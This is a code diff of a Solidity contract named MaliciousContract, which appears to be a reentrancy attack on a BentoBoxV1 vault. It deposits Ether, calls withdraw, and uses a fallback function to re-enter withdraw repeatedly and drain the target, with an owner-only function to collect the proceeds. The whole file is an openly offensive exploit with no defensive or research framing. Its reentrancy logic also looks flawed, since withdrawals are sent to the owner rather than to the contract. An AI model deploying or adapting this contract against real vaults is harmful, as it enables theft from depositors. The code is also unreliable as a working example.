@@ -1,46 +1,37 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 
-import "./BentoBoxV1.sol"; // Import BentoBoxV1 contract
+import "./BentoBoxV1.sol";
 
 contract MaliciousContract {
-    address public owner;
-    BentoBoxV1 public targetContract;
-    uint256 public amount;
+    BentoBoxV1 public target;
+    address payable public owner;
 
-    event AttackExecuted(uint256 amount);
-    event WithdrawExecuted(uint256 amount);
-    event BalanceBeforeAttack(uint256 balance);
-
-    // Make _targetContract a payable address
-    constructor(address payable _targetContract) public {
+    constructor(address payable _target) public {
+        target = BentoBoxV1(_target);
         owner = msg.sender;
-        targetContract = BentoBoxV1(_targetContract);
     }
 
-    // Receive function to handle incoming Ether
-    receive() external payable {}
-
+    // Fallback function to trigger reentrancy
     fallback() external payable {
-        uint256 balance = targetContract.balanceOf(IERC20(address(0)), address(this));
-        if (balance > 0) {
-            emit BalanceBeforeAttack(balance);
-            // Attempt to withdraw in a loop to reenter the vulnerable contract
-            targetContract.withdraw(IERC20(address(0)), address(this), owner, balance, 0);
-            emit WithdrawExecuted(balance);
+        if (address(target).balance >= 1 ether) {
+            target.withdraw(IERC20(address(0)), address(this), owner, 1 ether, 0);
         }
     }
 
-    function attack(uint256 _amount) external {
-        require(msg.sender == owner, "Not the owner");
-        amount = _amount;
+    // Optional: receive function to accept Ether
+    receive() external payable {}
 
-        // Deposit small initial amount to initiate the attack
-        targetContract.deposit{value: amount}(IERC20(address(0)), address(this), address(this), amount, 0);
+    function attack(uint256 _amount) external payable {
+        // Initial deposit to BentoBox
+        target.deposit{value: _amount}(IERC20(address(0)), address(this), address(this), _amount, 0);
+        
+        // Initiate the attack
+        target.withdraw(IERC20(address(0)), address(this), owner, _amount, 0);
+    }
 
-        // Reenter the target contract by calling withdraw repeatedly
-        targetContract.withdraw(IERC20(address(0)), address(this), owner, amount, 0);
-
-        emit AttackExecuted(amount);
+    function withdraw() external {
+        require(msg.sender == owner, "Only owner can withdraw");
+        owner.transfer(address(this).balance);
     }
 }
